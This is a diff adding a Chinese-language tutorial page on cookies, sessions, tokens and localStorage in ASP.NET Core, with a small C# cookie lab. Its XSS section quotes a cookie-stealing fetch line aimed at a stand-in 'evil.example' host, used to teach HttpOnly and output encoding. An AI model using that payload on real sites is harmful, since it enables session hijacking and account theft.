@@ -1,0 +1,338 @@
+<!doctype html>
+<html lang="zh-Hant-TW">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>補充：Cookie 與類似的東西</title>
+<link rel="stylesheet" href="../assets/style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css" media="(prefers-color-scheme: light)">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css" media="(prefers-color-scheme: dark)">
+</head>
+<body>
+<main class="page">
+
+<div class="breadcrumb"><a href="../index.html">📚 部落格 Web API 學習筆記</a> / 補充</div>
+<h1>補充：Cookie 是什麼，還有哪些類似的東西（Session、Token、localStorage）</h1>
+<p class="subtitle">XSS 那張圖裡被偷走的 cookie 到底是什麼？伺服器怎麼給、瀏覽器怎麼帶、為什麼偷到就能冒充你？Session、Token、localStorage 又和它差在哪？</p>
+<div class="tags">
+  <span class="tag">Cookie</span><span class="tag">Set-Cookie</span><span class="tag">HttpOnly</span><span class="tag">SameSite</span>
+  <span class="tag">Session</span><span class="tag">Token</span><span class="tag">JWT</span><span class="tag">localStorage</span><span class="tag">HTTP 無狀態</span>
+</div>
+
+<div class="callout">
+<p>📌 <strong>什麼時候會用到這頁</strong></p>
+<ul>
+  <li>看了<a href="encoding-json-html.html#xss-how">編碼器那頁 3-1 的 XSS 圖</a>，想知道 <code>document.cookie</code> 讀到的是什麼</li>
+  <li>想知道「登入之後，伺服器怎麼記得我是誰」</li>
+  <li>聽過 Session、Token、JWT、localStorage，不知道它們和 cookie 差在哪</li>
+</ul>
+<p>這頁以觀念為主，最後有一個小實驗：起一個會發 cookie 的小網站，親眼看 header。</p>
+</div>
+
+<nav class="toc">
+  <strong>目錄</strong>
+  <ol>
+    <li><a href="#stateless">HTTP 不記得你：為什麼需要 cookie</a></li>
+    <li><a href="#what">Cookie 是什麼：一張瀏覽器自動帶的號碼牌</a></li>
+    <li><a href="#attrs">Cookie 的屬性：給號碼牌加規則</a></li>
+    <li><a href="#friends">類似的東西：Session、Token、localStorage</a></li>
+    <li><a href="#xss">回到 XSS：偷到 cookie 為什麼就能冒充你</a></li>
+    <li><a href="#lab">小實驗：起一個會發 cookie 的小網站</a></li>
+  </ol>
+</nav>
+
+<!-- ============================================================ -->
+<h2 id="stateless">1. HTTP 不記得你：為什麼需要 cookie</h2>
+<p>每一個 HTTP 請求都是獨立的一封信。伺服器收到、處理、回覆，然後就忘了。下一封信來的時候，伺服器不知道它和上一封是不是同一個人寄的。這叫 HTTP 的<strong>無狀態（stateless）</strong>。</p>
+<p>用一個會回答「你是誰」的 endpoint 實際試：連打兩次 <code>GET /me</code>，伺服器兩次都說不認識你。</p>
+<pre><code class="language-http">GET /me
+→ 200 OK
+沒有 cookie，不知道你是誰
+
+GET /me
+→ 200 OK
+沒有 cookie，不知道你是誰</code></pre>
+<p>可是部落格登入之後，再點「我的文章」，伺服器得知道你是誰。要讓無狀態的 HTTP 認得出「這幾封信是同一個人寄的」，就得在每封信上放一個記號。這個記號最常見的做法，就是 cookie。</p>
+
+<!-- ============================================================ -->
+<h2 id="what">2. Cookie 是什麼：一張瀏覽器自動帶的號碼牌</h2>
+<div class="table-wrap">
+<table>
+  <tr><th>詞</th><th>做什麼</th><th>目的是什麼</th></tr>
+  <tr><td><strong>Cookie</strong></td><td>伺服器在回應的 header 裡放一行 <code>Set-Cookie: 名字=值</code>；瀏覽器記下這段文字，之後每次對<strong>同一個網站</strong>的請求，自動在 header 裡加一行 <code>Cookie: 名字=值</code> 帶回去</td><td>讓無狀態的 HTTP 認得出「這幾個請求是同一個人」</td></tr>
+</table>
+</div>
+
+<div class="diagram">
+<img src="../images/cookie-what.svg" alt="Cookie 是什麼：上排沒有 cookie 時，瀏覽器每次 GET /me 伺服器都回「不知道你是誰」；下排有 cookie 時，GET /login 的回應帶 Set-Cookie: user=alice，瀏覽器放進 cookie 罐，之後每個請求瀏覽器自動加上 Cookie: user=alice，伺服器回「你是 alice」" style="width:100%;height:auto">
+<div class="diagram-caption">上排：沒有號碼牌，每次都是陌生人。下排：第一次回應發號碼牌，之後瀏覽器自己每次帶回</div>
+</div>
+
+<p>把下排的流程用實際的 HTTP header 走一次（第 6 節的小程式跑出來的）：</p>
+<div class="diagram">
+<div class="mermaid">
+sequenceDiagram
+    participant B as 瀏覽器
+    participant S as 你的 API
+    B->>S: GET /me（沒有 Cookie header）
+    S-->>B: 200「沒有 cookie，不知道你是誰」
+    B->>S: GET /login
+    S-->>B: 200 + Set-Cookie: user=alice
+    Note over B: 瀏覽器把 user=alice 放進 cookie 罐
+    B->>S: GET /me + Cookie: user=alice（瀏覽器自動加）
+    S-->>B: 200「你是 alice」
+    B->>S: 之後每一個請求都自動帶 Cookie: user=alice
+</div>
+<div class="diagram-caption">Set-Cookie 是伺服器→瀏覽器的 header，Cookie 是瀏覽器→伺服器的 header，名字差一個 Set</div>
+</div>
+
+<p><strong>🔍 實測</strong>：用 curl 看原始 header。<code>/login</code> 的回應多了一行 <code>Set-Cookie</code>；把那個值放進 <code>Cookie</code> header 再打 <code>/me</code>，伺服器就認得你：</p>
+<pre><code class="language-http">GET /login
+HTTP/1.1 200 OK
+Content-Type: text/plain; charset=utf-8
+Server: Kestrel
+Set-Cookie: user=alice; max-age=1800; path=/; samesite=lax; httponly
+
+已登入，看回應 header 裡的 Set-Cookie
+
+GET /me　　（這次 header 裡有 Cookie: user=alice）
+HTTP/1.1 200 OK
+Content-Type: text/plain; charset=utf-8
+Server: Kestrel
+
+你是 alice</code></pre>
+
+<p>四件事要抓住：</p>
+<ul>
+  <li><strong>瀏覽器自動帶</strong>。前端程式一行都沒寫，瀏覽器自己在每個請求加上 <code>Cookie</code> header。這是 cookie 最大的方便，也是它所有安全問題的來源：只要是「從這個瀏覽器發出、送往這個網站」的請求，不管是誰觸發的，都帶著。</li>
+  <li><strong>綁網站</strong>。cookie 屬於發它的那個網站。對 <code>localhost:5050</code> 的請求才會帶 <code>user=alice</code>，對別的網站不帶，別的網站也看不到它。</li>
+  <li><strong>只是文字</strong>。伺服器給什麼，瀏覽器就記什麼，沒有加密。所以 cookie 裡放的通常是「識別用的鑰匙」（一串亂數、一個簽過名的憑證），不是密碼這種機密本身。</li>
+  <li><strong>在哪裡看</strong>。瀏覽器 F12 → Application → Cookies；或 <code>curl -i</code> 看回應 header；或 Rider 的 <code>.http</code> 檔，回應 header 會直接列出來。</li>
+</ul>
+
+<h3 id="syntax">正式語法：ASP.NET Core 怎麼發、怎麼讀</h3>
+<div class="table-wrap">
+<table>
+  <tr><th>要做的事</th><th>寫法</th><th>官方文件</th></tr>
+  <tr><td>發 cookie（回應加 Set-Cookie）</td><td><code>Response.Cookies.Append("user", "alice", new CookieOptions { … });</code></td><td><a href="https://learn.microsoft.com/dotnet/api/microsoft.aspnetcore.http.iresponsecookies.append" target="_blank">IResponseCookies.Append</a></td></tr>
+  <tr><td>讀 cookie（從請求的 Cookie header 拿）</td><td><code>string? user = Request.Cookies["user"];</code>，沒有就是 <code>null</code></td><td><a href="https://learn.microsoft.com/dotnet/api/microsoft.aspnetcore.http.irequestcookiecollection" target="_blank">IRequestCookieCollection</a></td></tr>
+  <tr><td>刪 cookie（叫瀏覽器丟掉）</td><td><code>Response.Cookies.Delete("user");</code>，實際是送一個已過期的 Set-Cookie</td><td>同上</td></tr>
+  <tr><td>設屬性</td><td><code>CookieOptions</code> 的 <code>HttpOnly</code>、<code>SameSite</code>、<code>Secure</code>、<code>MaxAge</code>、<code>Path</code></td><td><a href="https://learn.microsoft.com/dotnet/api/microsoft.aspnetcore.http.cookieoptions" target="_blank">CookieOptions</a></td></tr>
+</table>
+</div>
+<p>在 Controller 裡，<code>Request</code> 和 <code>Response</code> 是 <code>ControllerBase</code> 的屬性，直接用；在 Minimal API 的 lambda 裡要先接一個 <code>HttpContext</code> 參數，再用 <code>context.Request</code>、<code>context.Response</code>。</p>
+
+<!-- ============================================================ -->
+<h2 id="attrs">3. Cookie 的屬性：給號碼牌加規則</h2>
+<p>第 2 節那行 <code>Set-Cookie</code> 分號後面的東西就是屬性。它們不會被帶回伺服器，是寫給<strong>瀏覽器</strong>看的規則：這張號碼牌什麼時候帶、什麼時候不帶、誰能碰。</p>
+<pre><code class="language-http">Set-Cookie: user=alice; max-age=1800; path=/; samesite=lax; httponly
+            ─────┬────  ────┬───────  ──┬───  ─────┬──────  ───┬────
+            名字=值      30 分鐘後失效   全站都帶  別站連過來少帶  JS 讀不到</code></pre>
+<div class="table-wrap">
+<table>
+  <tr><th>屬性</th><th>做什麼</th><th>目的是什麼</th></tr>
+  <tr><td><code>Max-Age</code> / <code>Expires</code></td><td>多久之後失效。<strong>兩個都沒設</strong>的話，瀏覽器關掉就消失，叫 session cookie</td><td>控制號碼牌的有效期</td></tr>
+  <tr><td><code>Path</code></td><td>只有網址路徑在這底下才帶。<code>/</code> 就是全站</td><td>縮小帶的範圍</td></tr>
+  <tr><td><code>Domain</code></td><td>哪些網域會帶。沒設就只有發它的那一台主機</td><td>縮小帶的範圍，或讓子網域共用</td></tr>
+  <tr><td><code>Secure</code></td><td>只在 https 連線才帶</td><td>不在明文連線上外洩。本機用 http 測試時先不設</td></tr>
+  <tr><td><code>HttpOnly</code></td><td>JavaScript 的 <code>document.cookie</code> 讀不到它，但請求照樣自動帶</td><td>XSS 的程式碼<strong>偷不走</strong>它（第 5 節）</td></tr>
+  <tr><td><code>SameSite</code></td><td><code>Strict</code>：從別的網站連過來的請求一律不帶。<code>Lax</code>：只有「點連結這種最上層的 GET」才帶。<code>None</code>：都帶，但必須同時 <code>Secure</code></td><td>防 CSRF（下面的補充）。ASP.NET Core 的 <code>CookieOptions.SameSite</code> 預設是 <code>Unspecified</code>，也就是不輸出這個屬性；現在的瀏覽器把沒寫的當成 <code>Lax</code></td></tr>
+</table>
+</div>
+
+<details class="aside">
+<summary>📎 補充：SameSite 在防什麼（CSRF）</summary>
+<div class="aside-body">
+<p>「瀏覽器自動帶」有一個副作用：請求不一定是你的網站觸發的。假設你登入了 <code>blog.example</code>，cookie 還有效。這時你打開一個惡意網站，它的頁面裡藏了一個指向 <code>blog.example/api/posts/1</code> 的刪除請求。瀏覽器看到目的地是 <code>blog.example</code>，就<strong>照規則把 cookie 帶上</strong>，伺服器看到有效的號碼牌，就真的刪了。你什麼都沒點，文章就不見了。這叫 CSRF（跨站請求偽造）。</p>
+<p><code>SameSite=Lax</code> 讓瀏覽器在「從別的網站發起」的請求上不帶 cookie（除了點連結這種最上層的 GET），惡意網站的請求就變成沒有號碼牌的陌生人。這是 SameSite 存在的理由。官方說明：<a href="https://learn.microsoft.com/aspnet/core/security/samesite" target="_blank">Work with SameSite cookies in ASP.NET Core</a>。</p>
+</div>
+</details>
+
+<!-- ============================================================ -->
+<h2 id="friends">4. 類似的東西：Session、Token、localStorage</h2>
+<p>「記得你是誰」不是只有 cookie 一種做法。常聽到的四個東西，用五個問題拆開比：</p>
+<div class="table-wrap">
+<table>
+  <tr><th>東西</th><th>存在哪裡</th><th>誰把它放進請求</th><th>伺服器能設定它嗎</th><th>JavaScript 讀得到嗎</th><th>什麼時候消失</th></tr>
+  <tr><td><strong>Cookie</strong></td><td>瀏覽器的 cookie 罐</td><td><strong>瀏覽器自動</strong></td><td>能（<code>Set-Cookie</code>）</td><td>預設能；設 <code>HttpOnly</code> 後不能</td><td><code>Max-Age</code> 到期、關瀏覽器（沒設期限時）、伺服器 <code>Delete</code></td></tr>
+  <tr><td><strong>Session</strong>（伺服器端）</td><td>伺服器（記憶體、Redis、資料庫）。瀏覽器只拿到一個裝著 session id 的 cookie</td><td>瀏覽器自動（id 在 cookie 裡）</td><td>能</td><td>資料本身讀不到，只有 id 的 cookie</td><td>閒置逾時（ASP.NET Core 預設 20 分鐘）或伺服器清掉</td></tr>
+  <tr><td><strong>Token</strong>（例如 JWT）放 <code>Authorization</code> header</td><td>前端程式決定：變數、localStorage、也可以放 cookie</td><td><strong>前端程式自己加</strong> <code>Authorization: Bearer …</code></td><td>發得出來，但放哪裡由前端決定</td><td>看放哪裡：放 localStorage 就讀得到</td><td>token 本身有到期時間</td></tr>
+  <tr><td><strong>localStorage</strong> / <strong>sessionStorage</strong></td><td>瀏覽器，伺服器完全看不到</td><td><strong>從不自動帶</strong></td><td>不能</td><td>能</td><td>localStorage 到你清掉為止；sessionStorage 關分頁就消失</td></tr>
+</table>
+</div>
+
+<div class="diagram">
+<img src="../images/cookie-friends.svg" alt="四種記得你的東西住在哪裡、誰把它放進請求：瀏覽器這一邊有 cookie 罐（瀏覽器自動放進每個請求，HttpOnly 後 JavaScript 讀不到）、localStorage（從不自動帶，JavaScript 讀得到）、前端程式（讀 localStorage 的 token 自己寫進 Authorization header）；伺服器這一邊從 Cookie 或 Authorization header 認出你，Session 存放區把真正的資料放在伺服器、cookie 裡只放一把鑰匙" style="width:100%;height:auto">
+<div class="diagram-caption">左邊住在瀏覽器，右邊住在伺服器；綠色箭頭是瀏覽器自動帶的，藍色箭頭是前端程式自己加的</div>
+</div>
+
+<p>表格裡最重要的是「誰把它放進請求」和「JavaScript 讀得到嗎」這兩欄，因為它們決定各自怕什麼：</p>
+<ul>
+  <li><strong>瀏覽器自動帶的</strong>（cookie、靠 cookie 的 session）：方便，但別的網站也能借你的瀏覽器發請求，所以要靠 <code>SameSite</code> 擋 CSRF。</li>
+  <li><strong>前端程式自己帶的</strong>（token）：別的網站的程式碼拿不到你的 token，沒有 CSRF 的問題；但 token 放在 localStorage 時 JavaScript 讀得到，XSS 一來就被整個搬走。</li>
+  <li><strong>Session</strong> 不是和 cookie 對立的東西，而是「資料放伺服器、cookie 裡只放鑰匙」的用法。鑰匙丟了一樣會被冒充，所以上面關於 cookie 的規則它全部適用。</li>
+</ul>
+<p>你的 Web API 之後給前端（React 之類）用，第 5 課會用 JWT 走 token 這條路；傳統「伺服器產生整個網頁」的網站多半走 cookie + session。這頁只看它們住在哪、誰帶；JWT 裡面長什麼樣留到第 5 課。</p>
+
+<details class="aside">
+<summary>📎 補充：ASP.NET Core 的 Session 怎麼開</summary>
+<div class="aside-body">
+<p>Session 在 ASP.NET Core 不是預設開的，要在 <code>Program.cs</code> 登記兩行：</p>
+<pre><code class="language-csharp">// 登記 session 服務；資料預設放在這台伺服器的記憶體裡
+builder.Services.AddSession();
+
+// 加進 pipeline：每個請求進來先找 cookie 裡的 session id，對應到伺服器上的那份資料
+app.UseSession();</code></pre>
+<p>之後 <code>HttpContext.Session.SetString("user", "alice")</code> 寫、<code>GetString("user")</code> 讀。瀏覽器拿到的 cookie 名字預設是 <code>.AspNetCore.Session</code>，值是一串加密過的 id，資料本身不在裡面。官方文件：<a href="https://learn.microsoft.com/aspnet/core/fundamentals/app-state" target="_blank">Session and state management in ASP.NET Core</a>。</p>
+</div>
+</details>
+
+<!-- ============================================================ -->
+<h2 id="xss">5. 回到 XSS：偷到 cookie 為什麼就能冒充你</h2>
+<p>編碼器那頁 3-1 的攻擊字串是 <code>fetch("https://evil.example/?c=" + document.cookie)</code>。現在可以把它拆開了：</p>
+<ul>
+  <li><code>document.cookie</code> 讀的是<strong>這個網站所有沒設 HttpOnly 的 cookie</strong>，格式像 <code>user=alice; theme=dark</code>。</li>
+  <li>攻擊者拿到 <code>user=alice</code> 之後，在<strong>自己的</strong>瀏覽器設一個一模一樣的 cookie，再打 <code>GET /me</code>。伺服器只看號碼牌，號碼牌一樣，就把他當成 alice。這叫 session hijacking（劫持）。</li>
+  <li>設了 <code>HttpOnly</code>，<code>document.cookie</code> 就看不到 <code>user=alice</code>，上面那段程式碼送出去的是空的。這是 HttpOnly 的價值。</li>
+  <li>但 XSS 的程式碼還是在你的網站上跑。它可以直接 <code>fetch("/api/posts/1", { method: "DELETE" })</code>，瀏覽器看到目的地是你的網站，<strong>照樣自動帶 cookie</strong>，伺服器照樣當成 alice 在操作。HttpOnly 擋得了「偷走號碼牌」，擋不了「借用你的瀏覽器」。</li>
+</ul>
+<p>所以順序是：先用<a href="encoding-json-html.html#xss-where">輸出時編碼</a>讓 XSS 根本跑不起來，再用 HttpOnly 當第二道保險。兩個都要。</p>
+
+<!-- ============================================================ -->
+<h2 id="lab">6. 小實驗：起一個會發 cookie 的小網站</h2>
+<p>第 2 節的 header 就是這個實驗跑出來的。不用開專案，一個 .cs 檔就能起網站。</p>
+
+<h3 id="lab-syntax">正式語法：.NET 10 單檔程式起一個 Web 伺服器</h3>
+<pre><code class="language-csharp">// 第一行：告訴 SDK 這是 Web 專案，不然沒有 WebApplication 這些型別
+#:sdk Microsoft.NET.Sdk.Web
+
+WebApplicationBuilder builder = WebApplication.CreateBuilder(args);
+WebApplication app = builder.Build();
+
+// 一個 endpoint：lambda 接 HttpContext 就能碰 Request 和 Response
+app.MapGet("/hello", (HttpContext context) =&gt; "hi");
+
+// 指定網址和 port 啟動；終端機按 Ctrl+C 停掉。port 被佔用就換一個數字
+app.Run("http://localhost:5050");</code></pre>
+<pre><code class="language-powershell"># 放在任何「沒有 .csproj」的資料夾
+dotnet run cookie-lab.cs</code></pre>
+<p>官方文件：<a href="https://learn.microsoft.com/dotnet/core/sdk/file-based-apps" target="_blank">File-based apps</a>（<code>#:sdk</code> 指令在這頁）、<a href="https://learn.microsoft.com/aspnet/core/fundamentals/minimal-apis" target="_blank">Minimal APIs</a>（<code>MapGet</code>）。這個實驗只回傳字串，不需要編碼器那頁第 8 節說的 <code>PublishAot</code> 設定；如果你改成回傳物件（JSON），會不會需要，自己試試看。</p>
+
+<div class="exercise">
+<h3>實驗：/login 發號碼牌，/me 認人</h3>
+<p>需求：</p>
+<ul>
+  <li><code>GET /login</code>：發一個名字 <code>user</code>、值 <code>alice</code> 的 cookie，設 <code>HttpOnly</code>、<code>SameSite=Lax</code>、30 分鐘後失效；回傳一句話</li>
+  <li><code>GET /me</code>：讀 <code>user</code> 這個 cookie。有就回「你是 alice」，沒有就回「沒有 cookie，不知道你是誰」</li>
+  <li>用 <code>curl -i</code> 或 Rider 的 <code>.http</code> 檔先打 <code>/me</code>、再打 <code>/login</code> 看 <code>Set-Cookie</code>、再帶著 cookie 打 <code>/me</code></li>
+  <li>用瀏覽器打開 <code>/login</code> 再打開 <code>/me</code>，看瀏覽器自己帶了；F12 → Application → Cookies 看那張號碼牌</li>
+</ul>
+<p><strong>💡 提示</strong></p>
+<div class="table-wrap">
+<table>
+  <tr><th>需求</th><th>用什麼</th></tr>
+  <tr><td>發 cookie</td><td><code>context.Response.Cookies.Append("user", "alice", options)</code></td></tr>
+  <tr><td>屬性</td><td><code>new CookieOptions { HttpOnly = true, SameSite = SameSiteMode.Lax, MaxAge = TimeSpan.FromMinutes(30) }</code></td></tr>
+  <tr><td>讀 cookie</td><td><code>context.Request.Cookies["user"]</code>，型別是 <code>string?</code></td></tr>
+  <tr><td>curl 帶 cookie</td><td><code>curl -i -H "Cookie: user=alice" http://localhost:5050/me</code>；或 <code>-c jar.txt</code> 存、<code>-b jar.txt</code> 帶，模擬瀏覽器</td></tr>
+  <tr><td>.http 檔帶 cookie</td><td>在請求行下面加一行 <code>Cookie: user=alice</code></td></tr>
+</table>
+</div>
+<p>🧪 <strong>先故意少做一件事</strong>：第一次先<strong>不設</strong> <code>HttpOnly</code>，用瀏覽器開 <code>/login</code>，F12 → Console 打 <code>document.cookie</code>，看到什麼？加上 <code>HttpOnly</code> 重跑，再打一次。這就是第 5 節第三點。</p>
+<p class="accept">✅ 驗收：<code>/login</code> 的回應 header 有 <code>Set-Cookie: user=alice; max-age=1800; path=/; samesite=lax; httponly</code>；帶 cookie 打 <code>/me</code> 回「你是 alice」，不帶回「沒有 cookie，不知道你是誰」；設 HttpOnly 後 <code>document.cookie</code> 是空字串</p>
+<details class="answer">
+<summary>參考答案（寫完再打開）</summary>
+<div class="answer-body">
+<p class="file-label">cookie-lab.cs</p>
+<pre><code class="language-csharp">#:sdk Microsoft.NET.Sdk.Web
+
+WebApplicationBuilder builder = WebApplication.CreateBuilder(args);
+WebApplication app = builder.Build();
+
+// 登入：伺服器在回應裡放一個 Set-Cookie header，瀏覽器收到就會記起來
+app.MapGet("/login", (HttpContext context) =&gt;
+{
+    CookieOptions options = new CookieOptions
+    {
+        HttpOnly = true,              // JavaScript 的 document.cookie 讀不到
+        SameSite = SameSiteMode.Lax,  // 從別的網站連過來的請求，大部分不帶這個 cookie
+        MaxAge = TimeSpan.FromMinutes(30)
+    };
+    context.Response.Cookies.Append("user", "alice", options);
+    return "已登入，看回應 header 裡的 Set-Cookie";
+});
+
+// 之後的請求：瀏覽器自動把 cookie 放進 Cookie header 帶回來，伺服器從 Request.Cookies 讀
+app.MapGet("/me", (HttpContext context) =&gt;
+{
+    string? user = context.Request.Cookies["user"];
+    return user is null ? "沒有 cookie，不知道你是誰" : "你是 " + user;
+});
+
+app.Run("http://localhost:5050");</code></pre>
+<p>curl 實際跑出來的（.NET SDK 10.0.303）：</p>
+<pre><code class="language-powershell">curl -i http://localhost:5050/me
+# HTTP/1.1 200 OK
+# Content-Type: text/plain; charset=utf-8
+# Server: Kestrel
+#
+# 沒有 cookie，不知道你是誰
+
+curl -i http://localhost:5050/login
+# HTTP/1.1 200 OK
+# Content-Type: text/plain; charset=utf-8
+# Server: Kestrel
+# Set-Cookie: user=alice; max-age=1800; path=/; samesite=lax; httponly
+#
+# 已登入，看回應 header 裡的 Set-Cookie
+
+curl -i -H "Cookie: user=alice" http://localhost:5050/me
+# HTTP/1.1 200 OK
+# ...
+# 你是 alice
+
+# 模擬瀏覽器：-c 把 Set-Cookie 記進 jar.txt，-b 下一次自動帶
+curl -s -c jar.txt http://localhost:5050/login
+curl -s -b jar.txt http://localhost:5050/me
+# 你是 alice</code></pre>
+<p><code>jar.txt</code> 打開看，curl 記下的就是瀏覽器 cookie 罐裡的那一筆，連 HttpOnly 都標了：</p>
+<pre><code class="language-plaintext">#HttpOnly_localhost	FALSE	/	FALSE	1793247796	user	alice</code></pre>
+<p>沒設 HttpOnly 時，瀏覽器 Console 打 <code>document.cookie</code> 會印出 <code>"user=alice"</code>；設了之後印出 <code>""</code>，但 <code>/me</code> 照樣回「你是 alice」，因為請求還是自動帶著它。</p>
+</div>
+</details>
+</div>
+
+<!-- ============================================================ -->
+<h2 id="next">延伸問題</h2>
+<ol>
+  <li><code>blog.example</code> 和 <code>shop.example</code> 各自發了 cookie。瀏覽器對 <code>blog.example</code> 發請求時，會把兩邊的都帶上嗎？第 2 節的「綁網站」在講什麼？</li>
+  <li>你的 Web API 之後給 React 前端用，登入憑證要走 cookie 還是 token？用「誰帶」和「JavaScript 讀不讀得到」兩個軸各想一次。</li>
+  <li>Session 的資料放在伺服器記憶體。API 開兩台機器做負載平衡，第二個請求被導到另一台，會發生什麼事？</li>
+</ol>
+
+<div class="callout">
+<p>📖 <strong>官方文件</strong></p>
+<ul>
+  <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies" target="_blank">MDN：Using HTTP cookies</a>（cookie 的整體說明，屬性、安全性都在這頁）、<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie" target="_blank">MDN：Set-Cookie header</a></li>
+  <li><a href="https://learn.microsoft.com/dotnet/api/microsoft.aspnetcore.http.cookieoptions" target="_blank">CookieOptions</a>、<a href="https://learn.microsoft.com/dotnet/api/microsoft.aspnetcore.http.iresponsecookies.append" target="_blank">Response.Cookies.Append</a>、<a href="https://learn.microsoft.com/dotnet/api/microsoft.aspnetcore.http.irequestcookiecollection" target="_blank">Request.Cookies</a></li>
+  <li><a href="https://learn.microsoft.com/aspnet/core/security/samesite" target="_blank">Work with SameSite cookies in ASP.NET Core</a></li>
+  <li><a href="https://learn.microsoft.com/aspnet/core/fundamentals/app-state" target="_blank">Session and state management in ASP.NET Core</a></li>
+  <li><a href="https://learn.microsoft.com/aspnet/core/security/authentication/cookie" target="_blank">Use cookie authentication without ASP.NET Core Identity</a>（登入憑證放 cookie 的正規做法，第 5 課再回來）</li>
+  <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API" target="_blank">MDN：Web Storage API</a>（localStorage、sessionStorage）</li>
+</ul>
+</div>
+
+<nav class="footer-nav">
+  <a href="encoding-json-html.html#xss-how">← 回編碼器補充頁 3-1</a>
+  <a href="../index.html">回目錄</a>
+  <span></span>
+</nav>
+
+</main>
+<script src="https://cdn.jsdelivr.net/npm/mermaid@10.9.1/dist/mermaid.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/powershell.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/http.min.js"></script>
+<script src="../assets/lesson.js"></script>
+</body>
+</html>
